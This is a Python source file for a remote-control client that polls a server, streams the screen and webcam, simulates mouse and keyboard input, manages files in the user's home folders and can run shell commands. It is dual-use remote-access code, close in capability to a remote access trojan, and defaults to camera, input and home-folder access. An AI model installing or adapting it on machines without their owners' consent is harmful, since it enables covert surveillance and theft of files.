# z16.py
# -*- coding: utf-8 -*-
"""
Neon Remote Client.

This client is designed to work with Zlata.py.

Features:
- authenticated heartbeat
- screen streaming only while Zlata is viewing it
- camera streaming only while Zlata is viewing it
- camera photo capture on demand
- click / double-click / right-click / text typing
- file manager inside a configurable shared folder
- optional remote command execution
- local chat-cache capability is intentionally separate; the persistent
  controller chat is stored by Zlata.py in its local JSON file.

Install on Windows:
  pip install requests pillow opencv-python pyautogui

Environment:
  SERVER_URL           e.g. https://your-server.example.com
  REMOTE_CLIENT_TOKEN  must match Zlata.py
  REMOTE_FS_ROOTS      semicolon list: name=absolute_path;name=absolute_path
  ALLOW_REMOTE_CAMERA  1/0 (default 1)
  ALLOW_REMOTE_INPUT   1/0 (default 1)
  ALLOW_REMOTE_CMD     1/0 (default 0)
"""
from __future__ import annotations

import base64
import io
import os
import shutil
import socket
import subprocess
import tempfile
import threading
import time
import uuid
from pathlib import Path
from typing import Any

import requests
from PIL import ImageGrab

SERVER_URL = os.environ.get("SERVER_URL", "https://zlata.onrender.com").rstrip("/")
CLIENT_TOKEN = os.environ.get("REMOTE_CLIENT_TOKEN", "change-me-client-token")
CLIENT_ID = os.environ.get("REMOTE_CLIENT_ID") or (str(uuid.getnode()) + "-" + socket.gethostname())
PC_NAME = os.environ.get("REMOTE_CLIENT_NAME", socket.gethostname())

ALLOW_REMOTE_CAMERA = os.environ.get("ALLOW_REMOTE_CAMERA", "1") == "1"
ALLOW_REMOTE_INPUT = os.environ.get("ALLOW_REMOTE_INPUT", "1") == "1"
ALLOW_REMOTE_CMD = os.environ.get("ALLOW_REMOTE_CMD", "0") == "1"

# Explicitly configured roots.  The client never accepts a path outside these roots.
def _default_fs_roots() -> dict[str, Path]:
    home = Path.home().resolve()
    roots = {"home": home}
    candidates = {
        "desktop": home / "Desktop",
        "documents": home / "Documents",
        "downloads": home / "Downloads",
        "shared": home / "RemoteNeonShare",
    }
    for name, path in candidates.items():
        if path.exists():
            roots[name] = path.resolve()
    return roots


def _parse_fs_roots() -> dict[str, Path]:
    raw = os.environ.get("REMOTE_FS_ROOTS", "").strip()
    if not raw:
        roots = _default_fs_roots()
    else:
        roots = {}
        for item in raw.split(";"):
            item = item.strip()
            if not item or "=" not in item:
                continue
            name, value = item.split("=", 1)
            name = name.strip().lower().replace(" ", "_")
            value = value.strip()
            if not name or not value:
                continue
            path = Path(value).expanduser().resolve()
            if path.exists() and path.is_dir():
                roots[name] = path
    if not roots:
        fallback = (home / "RemoteNeonShare").resolve() if 'home' in locals() else Path.home().resolve()
        fallback.mkdir(parents=True, exist_ok=True)
        roots = {"shared": fallback}
    for path in roots.values():
        path.mkdir(parents=True, exist_ok=True)
    return roots


REMOTE_FS_ROOTS = _parse_fs_roots()

FRAME_INTERVAL = float(os.environ.get("FRAME_INTERVAL", "0.07"))
HEARTBEAT_INTERVAL = float(os.environ.get("HEARTBEAT_INTERVAL", "1.0"))
HTTP_TIMEOUT = float(os.environ.get("HTTP_TIMEOUT", "6"))

STREAMING_SCREEN = False
STREAMING_CAMERA = False
STOP = False

try:
    import pyautogui
    PYAUTOGUI_AVAILABLE = True
    try:
        pyautogui.FAILSAFE = True
    except Exception:
        pass
except Exception:
    PYAUTOGUI_AVAILABLE = False

try:
    import cv2
    CV2_AVAILABLE = True
except Exception:
    CV2_AVAILABLE = False

try:
    import psutil
    PSUTIL_AVAILABLE = True
except Exception:
    psutil = None
    PSUTIL_AVAILABLE = False


def headers() -> dict[str, str]:
    return {"X-Client-Token": CLIENT_TOKEN}


def post_json(path: str, payload: dict[str, Any], timeout: float = HTTP_TIMEOUT):
    r = requests.post(
        SERVER_URL + path,
        json=payload,
        headers=headers(),
        timeout=timeout,
    )
    r.raise_for_status()
    return r.json()


def _split_remote_path(rel: str) -> tuple[str, Path, str]:
    rel = (rel or "").replace("\\", "/").strip("/")
    if not rel:
        raise ValueError("root list")
    parts = [p for p in rel.split("/") if p not in ("", ".")]
    root_name = parts[0].lower()
    if root_name not in REMOTE_FS_ROOTS:
        raise ValueError("unknown filesystem root")
    root = REMOTE_FS_ROOTS[root_name].resolve()
    sub = Path(*parts[1:]) if len(parts) > 1 else Path()
    target = (root / sub).resolve()
    try:
        target.relative_to(root)
    except ValueError:
        raise ValueError("Path traversal blocked")
    return root_name, target, "/".join(parts)


def safe_rel(rel: str) -> Path:
    return _split_remote_path(rel)[1]


def rel_for(path: Path) -> str:
    resolved = path.resolve()
    for name, root in REMOTE_FS_ROOTS.items():
        try:
            return f"{name}/{resolved.relative_to(root).as_posix()}".rstrip("/")
        except ValueError:
            continue
    raise ValueError("path is outside configured roots")


def file_list(rel: str) -> dict[str, Any]:
    if not (rel or "").strip("/\\"):
        items = []
        for name, root in sorted(REMOTE_FS_ROOTS.items()):
            try:
                st = root.stat()
                items.append({"name": name, "is_dir": True, "size": None, "mtime": time.strftime("%Y-%m-%d %H:%M", time.localtime(st.st_mtime)), "rel": name})
            except (OSError, PermissionError):
                continue
        return {"ok": True, "path": "", "items": items, "roots": {k: str(v) for k, v in REMOTE_FS_ROOTS.items()}}
    base = safe_rel(rel)
    if not base.exists():
        return {"ok": False, "error": "path not found"}
    if not base.is_dir():
        return {"ok": False, "error": "not a directory"}

    items = []
    for p in sorted(base.iterdir(), key=lambda x: (not x.is_dir(), x.name.lower())):
        try:
            st = p.stat()
            items.append({
                "name": p.name,
                "is_dir": p.is_dir(),
                "size": st.st_size if p.is_file() else None,
                "mtime": time.strftime("%Y-%m-%d %H:%M", time.localtime(st.st_mtime)),
                "rel": rel_for(p),
            })
        except (OSError, PermissionError):
            continue
    return {"ok": True, "path": rel_for(base), "items": items, "roots": {k: str(v) for k, v in REMOTE_FS_ROOTS.items()}}


def file_view(rel: str) -> dict[str, Any]:
    path = safe_rel(rel)
    if not path.is_file():
        return {"ok": False, "error": "not a file"}
    if path.stat().st_size > 300_000:
        return {"ok": False, "error": "text preview limited to 300 KB"}
    try:
        return {"ok": True, "content": path.read_text(encoding="utf-8", errors="replace")}
    except Exception as exc:
        return {"ok": False, "error": str(exc)}


def file_download(rel: str) -> dict[str, Any]:
    path = safe_rel(rel)
    if not path.is_file():
        return {"ok": False, "error": "not a file"}
    if path.stat().st_size > 8 * 1024 * 1024:
        return {"ok": False, "error": "download limited to 8 MB"}
    data = path.read_bytes()
    return {
        "ok": True,
        "data_b64": base64.b64encode(data).decode("ascii"),
        "name": path.name,
    }


def file_delete(rel: str) -> dict[str, Any]:
    path = safe_rel(rel)
    try:
        _, target, rel_path = _split_remote_path(rel)
        if rel_path.count("/") == 0:
            return {"ok": False, "error": "cannot delete filesystem root"}
    except ValueError as exc:
        return {"ok": False, "error": str(exc)}
    if not path.exists():
        return {"ok": False, "error": "not found"}
    try:
        if path.is_dir():
            shutil.rmtree(path)
        else:
            path.unlink()
        return {"ok": True}
    except Exception as exc:
        return {"ok": False, "error": str(exc)}


def file_upload(rel: str, name: str, data_b64: str) -> dict[str, Any]:
    if len(data_b64) > 11 * 1024 * 1024:
        return {"ok": False, "error": "upload too large"}
    if "/" in name or "\\" in name or name in {"", ".", ".."}:
        return {"ok": False, "error": "invalid filename"}
    parent = safe_rel(rel)
    parent.mkdir(parents=True, exist_ok=True)
    dest = (parent / Path(name).name).resolve()
    try:
        root_name, _, _ = _split_remote_path(rel)
        dest.relative_to(REMOTE_FS_ROOTS[root_name])
    except ValueError:
        return {"ok": False, "error": "path traversal blocked"}
    try:
        raw = base64.b64decode(data_b64, validate=True)
        if len(raw) > 8 * 1024 * 1024:
            return {"ok": False, "error": "upload too large"}
        dest.write_bytes(raw)
        return {"ok": True, "name": dest.name}
    except Exception as exc:
        return {"ok": False, "error": str(exc)}


def capture_screen_jpeg(quality: int = 55) -> bytes:
    img = ImageGrab.grab()
    buf = io.BytesIO()
    img.convert("RGB").save(buf, format="JPEG", quality=quality, optimize=True)
    return buf.getvalue()


def stream_screen_loop():
    global STREAMING_SCREEN
    while not STOP:
        if not STREAMING_SCREEN:
            time.sleep(0.3)
            continue
        try:
            frame = capture_screen_jpeg(50)
            requests.post(
                f"{SERVER_URL}/api/upload_frame/{CLIENT_ID}",
                data=frame,
                headers=headers(),
                timeout=2,
            )
        except Exception:
            pass
        time.sleep(FRAME_INTERVAL)


def capture_camera_jpeg(cap, quality: int = 60) -> bytes | None:
    ok, frame = cap.read()
    if not ok:
        return None
    ok, enc = cv2.imencode(".jpg", frame, [int(cv2.IMWRITE_JPEG_QUALITY), quality])
    return enc.tobytes() if ok else None


def stream_camera_loop():
    global STREAMING_CAMERA
    cap = None
    try:
        while not STOP:
            if not STREAMING_CAMERA or not ALLOW_REMOTE_CAMERA or not CV2_AVAILABLE:
                if cap is not None:
                    cap.release()
                    cap = None
                time.sleep(0.3)
                continue
            if cap is None:
                print("[CAMERA] Remote camera stream ACTIVE")
                cap = cv2.VideoCapture(0)
                if not cap.isOpened():
                    cap.release()
                    cap = None
                    time.sleep(1)
                    continue
            try:
                frame = capture_camera_jpeg(cap, 60)
                if frame:
                    requests.post(
                        f"{SERVER_URL}/api/upload_camera/{CLIENT_ID}",
                        data=frame,
                        headers=headers(),
                        timeout=2,
                    )
            except Exception:
                pass
            time.sleep(FRAME_INTERVAL)
    finally:
        if cap is not None:
            cap.release()


def camera_photo() -> dict[str, Any]:
    if not ALLOW_REMOTE_CAMERA:
        return {"ok": False, "error": "remote camera disabled on client"}
    if not CV2_AVAILABLE:
        return {"ok": False, "error": "opencv-python not installed"}

    cap = cv2.VideoCapture(0)
    if not cap.isOpened():
        return {"ok": False, "error": "camera could not be opened"}
    try:
        ok, frame = cap.read()
        if not ok:
            return {"ok": False, "error": "camera read failed"}
        ok, enc = cv2.imencode(".jpg", frame, [int(cv2.IMWRITE_JPEG_QUALITY), 85])
        if not ok:
            return {"ok": False, "error": "jpeg encode failed"}
        return {
            "ok": True,
            "data_b64": base64.b64encode(enc.tobytes()).decode("ascii"),
        }
    finally:
        cap.release()


def do_click(x: Any, y: Any, click_type: str) -> dict[str, Any]:
    if not ALLOW_REMOTE_INPUT:
        return {"ok": False, "error": "remote input disabled on client"}
    if not PYAUTOGUI_AVAILABLE:
        return {"ok": False, "error": "pyautogui not installed"}

    try:
        if x is not None and y is not None:
            x_i, y_i = int(x), int(y)
            pyautogui.moveTo(x_i, y_i, duration=0)
        if click_type == "click":
            pyautogui.click()
        elif click_type == "double":
            pyautogui.doubleClick()
        elif click_type == "right":
            pyautogui.rightClick()
        else:
            return {"ok": False, "error": "invalid click type"}
        return {"ok": True}
    except Exception as exc:
        return {"ok": False, "error": str(exc)}


def do_type(text: str) -> dict[str, Any]:
    if not ALLOW_REMOTE_INPUT:
        return {"ok": False, "error": "remote input disabled on client"}
    if not PYAUTOGUI_AVAILABLE:
        return {"ok": False, "error": "pyautogui not installed"}
    text = str(text)
    if len(text) > 4000:
        return {"ok": False, "error": "text too long"}
    try:
        pyautogui.write(text, interval=0.01)
        return {"ok": True}
    except Exception as exc:
        return {"ok": False, "error": str(exc)}


KEY_ALIASES = {
    "return": "enter", "esc": "esc", "escape": "esc", "spacebar": "space",
    "left": "left", "right": "right", "up": "up", "down": "down",
    "pageup": "pageup", "pagedown": "pagedown", "home": "home", "end": "end",
    "backspace": "backspace", "delete": "delete", "tab": "tab",
    "insert": "insert", "printscreen": "printscreen",
}
KEY_MODIFIERS = {"ctrl", "alt", "shift", "win", "command", "cmd"}


def do_key(key: str, modifiers: list[str] | None = None) -> dict[str, Any]:
    if not ALLOW_REMOTE_INPUT:
        return {"ok": False, "error": "remote input disabled on client"}
    if not PYAUTOGUI_AVAILABLE:
        return {"ok": False, "error": "pyautogui not installed"}
    raw_key = str(key or "").strip().lower()
    mapped = KEY_ALIASES.get(raw_key, raw_key)
    if not mapped or len(mapped) > 32:
        return {"ok": False, "error": "invalid key"}
    mods = [str(m).strip().lower() for m in (modifiers or [])]
    mods = [KEY_ALIASES.get(m, m) for m in mods]
    if any(m not in KEY_MODIFIERS for m in mods):
        return {"ok": False, "error": "invalid modifier"}
    try:
        if mods:
            pyautogui.hotkey(*mods, mapped)
        else:
            pyautogui.press(mapped)
        return {"ok": True, "key": mapped, "modifiers": mods}
    except Exception as exc:
        return {"ok": False, "error": str(exc)}


def demo_prank(action: str) -> dict[str, Any]:
    # Deliberately limited to harmless, opt-in local effects. No input locking,
    # mouse swapping, arbitrary window movement, or hidden persistence.
    if not ALLOW_REMOTE_INPUT:
        return {"ok": False, "error": "remote effects disabled on client"}
    action = str(action or "").lower()
    try:
        if action == "beep":
            import winsound
            winsound.MessageBeep()
            return {"ok": True, "action": action}
        return {"ok": False, "error": "unsupported safe demo effect"}
    except Exception as exc:
        return {"ok": False, "error": str(exc)}


def run_command(command: str) -> dict[str, Any]:
    if not ALLOW_REMOTE_CMD:
        return {"ok": False, "error": "remote command execution disabled on client"}
    try:
        proc = subprocess.run(
            command,
            shell=True,
            capture_output=True,
            text=True,
            timeout=30,
        )
        output = (proc.stdout or "") + (proc.stderr or "")
        if not output.strip():
            output = "[command completed]"
        return {"ok": True, "output": output[-100_000:], "returncode": proc.returncode}
    except subprocess.TimeoutExpired:
        return {"ok": False, "error": "command timeout"}
    except Exception as exc:
        return {"ok": False, "error": str(exc)}


def handle_job(job: dict[str, Any]) -> dict[str, Any]:
    action = job.get("action")
    payload = job.get("payload") or {}

    if action == "input_click":
        return do_click(payload.get("x"), payload.get("y"), payload.get("type", "click"))

    if action == "input_type":
        return do_type(payload.get("text", ""))

    if action == "input_key":
        return do_key(payload.get("key", ""), payload.get("modifiers") or [])

    if action == "demo_prank":
        return demo_prank(payload.get("effect", ""))

    if action == "camera_photo":
        return camera_photo()

    if action == "fs_list":
        return file_list(payload.get("path", ""))

    if action == "fs_view":
        return file_view(payload.get("path", ""))

    if action == "fs_download":
        return file_download(payload.get("path", ""))

    if action == "fs_delete":
        return file_delete(payload.get("path", ""))

    if action == "fs_upload":
        return file_upload(
            payload.get("path", ""),
            payload.get("name", ""),
            payload.get("data_b64", ""),
        )

    if action == "command":
        return run_command(payload.get("command", ""))

    return {"ok": False, "error": f"unknown action: {action}"}


def telemetry() -> tuple[float | None, float | None]:
    if not PSUTIL_AVAILABLE:
        return None, None
    try:
        return float(psutil.cpu_percent(interval=None)), float(psutil.virtual_memory().percent)
    except Exception:
        return None, None


def client_loop():
    global STREAMING_SCREEN, STREAMING_CAMERA, STOP

    while not STOP:
        try:
            caps = ["screen", "files"]
            if ALLOW_REMOTE_CAMERA and CV2_AVAILABLE:
                caps.append("camera")
            if ALLOW_REMOTE_INPUT and PYAUTOGUI_AVAILABLE:
                caps.append("input")
                caps.append("keyboard_events")
                caps.append("safe_demo_effects")
            if ALLOW_REMOTE_CMD:
                caps.append("commands")

            cpu, ram = telemetry()
            res = post_json(
                "/api/heartbeat",
                {
                    "client_id": CLIENT_ID,
                    "name": PC_NAME,
                    "caps": caps,
                    "cpu": cpu,
                    "ram": ram,
                },
                timeout=4,
            )

            STREAMING_SCREEN = bool(res.get("stream_screen"))
            STREAMING_CAMERA = bool(res.get("stream_camera"))

            for job in res.get("commands", []):
                job_id = job.get("id")
                try:
                    result = handle_job(job)
                except Exception as exc:
                    result = {"ok": False, "error": str(exc)}
                try:
                    post_json(
                        f"/api/job_result/{CLIENT_ID}/{job_id}",
                        result,
                        timeout=max(5, HTTP_TIMEOUT),
                    )
                except Exception:
                    pass

        except Exception as exc:
            STREAMING_SCREEN = False
            STREAMING_CAMERA = False
            if int(time.time()) % 15 == 0:
                print("[NET] connection error:", exc)

        time.sleep(HEARTBEAT_INTERVAL)


def main():
    print("=== Neon Remote Client ===")
    print("Client ID:", CLIENT_ID)
    print("PC:", PC_NAME)
    print("Server:", SERVER_URL)
    print("Configured filesystem roots:")
    for name, path in sorted(REMOTE_FS_ROOTS.items()):
        print(f"  {name}: {path}")
    print("Camera enabled:", ALLOW_REMOTE_CAMERA and CV2_AVAILABLE)
    print("Input enabled:", ALLOW_REMOTE_INPUT and PYAUTOGUI_AVAILABLE)
    print("Remote CMD enabled:", ALLOW_REMOTE_CMD)
    if CLIENT_TOKEN == "change-me-client-token":
        print("[WARN] Set REMOTE_CLIENT_TOKEN to the same value as Zlata.py")

    threading.Thread(target=stream_screen_loop, daemon=True).start()
    threading.Thread(target=stream_camera_loop, daemon=True).start()
    try:
        client_loop()
    except KeyboardInterrupt:
        STOP = True


if __name__ == "__main__":
    main()
